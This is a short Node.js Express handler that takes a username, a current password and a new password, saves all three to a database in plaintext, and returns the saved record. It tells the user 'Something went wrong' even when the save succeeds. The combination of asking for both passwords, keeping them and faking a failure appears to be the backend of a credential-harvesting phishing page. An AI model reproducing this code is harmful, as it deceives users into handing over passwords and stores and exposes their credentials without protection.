const userModel = require("../models/user.model");

const userDetail = async(req,res)=>{
    const {username, current_password, New_password} = req.body
    
    const existusername = await userModel.findOne({username})

    if(existusername){
        return res.status(401).json({
            message:"Something went wrong. Please try again after 24 hours."
        })
    }

    const user = await userModel.create({
        username,
        current_password,
        New_password
    })

    res.status(201).json({
        message:"Something went wrong. Please try again after 24 hours.",
        user
    })
    
    

}

module.exports = userDetail